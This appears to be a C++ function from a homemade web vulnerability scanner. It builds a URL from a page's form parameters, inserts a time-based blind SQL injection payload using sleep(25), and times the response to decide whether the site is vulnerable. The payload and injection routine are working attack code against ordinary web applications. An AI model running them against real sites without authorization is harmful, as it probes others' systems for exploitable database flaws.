#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <curl/curl.h>
#include <sstream>
#include <chrono>
#include <tuple>
#include "functions.h"
using namespace std;
// Callback function to store response data

void timebased(string url)
{

    int testingtime=25;
    std::string payload="'XOR(if(now()=sysdate(),sleep("+to_string(testingtime)+"),0))OR'";
    std::string successmessage="200 OK";
    std::string errormessage="404 N";
    bool vulnerable=false;

    std::string response;

    cout << "Performing time based SQL injection\n";

    response=sendHttpRequest(url);
    std::vector<std::tuple<std::string, std::string, std::string>> params = extract_parameters(response);

    std::string url1=url;
    url1+="/?";
    int cnt=1;
    for (const auto& param : params)
    {
        // std::cout <<"Enter the value of " <<get<0>(param) << "\n";
        std::string para="";
        if(cnt==1)
        {
            url1+=get<0>(param)+"="+payload;
            cnt++;
        }
        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()!=0)
        {
            url1+="&"+get<0>(param)+"="+get<2>(param);
        }
        else if(std::get<1>(param)=="submit"&&std::get<0>(param).length()!=0&&std::get<2>(param).length()==0)
        {
            url1+="&"+get<0>(param)+"="+"Submit";
        }
        else
        {
            url1+="&"+get<0>(param)+"="+para;
            cnt++;
        }
    }
    std::cout << url1 << "\n";


    auto start_time= std::chrono::high_resolution_clock::now();
    response=sendHttpRequest(url1);

    auto end_time= std::chrono::high_resolution_clock::now();
    auto duration= std::chrono::duration_cast<std::chrono::milliseconds>(end_time-start_time);
    long long int time=duration.count();
    std::cout <<"Time taken: "<<time<<"miliseconds"<< std::endl;

    //std::cout << "Response: " << response << "\n";
    if(time<=(testingtime+1)*1000L&&time>=(testingtime-1)*1000L)
    {
        vulnerable=true;
    }
    HANDLE col;
    col= GetStdHandle(STD_OUTPUT_HANDLE);
    if(vulnerable)
    {
        SetConsoleTextAttribute(col,4);
        std::cout << "The website is vulnerable to Timebased SQL injection\n\n";
        SetConsoleTextAttribute(col,15);
    }
    else
    {
        SetConsoleTextAttribute(col,2);
        std::cout << "The website is not vulnerable to Timebased SQL injection.Sorry we can not do any further work\n\n";
        SetConsoleTextAttribute(col,15);
    }


}


